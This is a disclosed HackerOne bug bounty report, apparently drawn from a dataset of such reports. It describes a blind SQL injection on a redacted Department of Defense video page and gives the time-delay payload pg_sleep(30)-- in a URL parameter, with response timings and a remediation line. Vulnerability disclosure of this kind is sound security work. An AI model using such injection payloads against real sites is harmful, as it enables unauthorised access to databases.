---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '242882'
original_report_id: '242882'
title: Blind SQL Injection on DoD Site
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2017-06-24T13:09:18.095Z'
disclosed_at: '2019-12-02T19:00:34.732Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- sql-injection
---

# Blind SQL Injection on DoD Site

## Metadata

- HackerOne Report ID: 242882
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2019-12-02T19:00:34.732Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi There, One of the DoD Site is vulnerable to blind sql injection.

#Affected Domain:
www.███

#PoC:
Navigate to below url
``http://www.█████████/viewVideo.asp?t=7``

Just replace ``7`` with ``pg_sleep(__30__)--``

***GET /viewVideo.asp?t=pg_sleep(__30__)--***

As a response you can see time delay compared with ``viewVideo.asp?t=7``

#####Time Slot:

*viewVideo.asp?t=7*                               -----------> 240-330 milliseconds
*viewVideo.asp?t=pg_sleep(__30__)--*    -----------> 15000-19000 milliseconds

#Fix:
Should sanitize the dangerous input or using parameterised queries.

Let me know if any further info is required.

Regards,
**Mr_R3boot**.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
